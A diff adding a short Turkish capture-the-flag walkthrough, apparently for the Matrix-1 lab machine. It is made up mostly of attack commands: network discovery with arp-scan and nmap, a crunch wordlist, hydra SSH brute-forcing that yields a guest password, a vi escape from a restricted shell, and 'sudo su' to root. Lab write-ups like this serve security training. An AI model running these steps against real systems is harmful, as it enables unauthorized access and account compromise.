@@ -1,0 +1,10 @@
+MATRIX-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.88 bulundu.
+2 - nmap -sT -A 192.168.2.88
+3 - http://192.168.2.88:31337 sayfasının kaynağı görüntülendi, hash base64 ile kırıldı.
+4 - http://192.168.2.88:31337/Cypher.matrix dosyasi indirildi, brainfuck ile kırıldı.
+5 - crunch 8 8 -t k1ll0r%@ -o matrix_1.txt
+6 - hydra -l guest -P matrix_1.txt ssh://192.168.2.88, guest:k1ll0r7n bulundu.
+7 - ssh guest@192.168.2.88, vi, :!/bin/bash ile terminal kullanılabilir hale getirildi.
+8 - export SHELL=/bin/bash:$SHELL, export PATH=/usr/bin:$PATH, export PATH=/bin:$PATH
+9 - sudo su
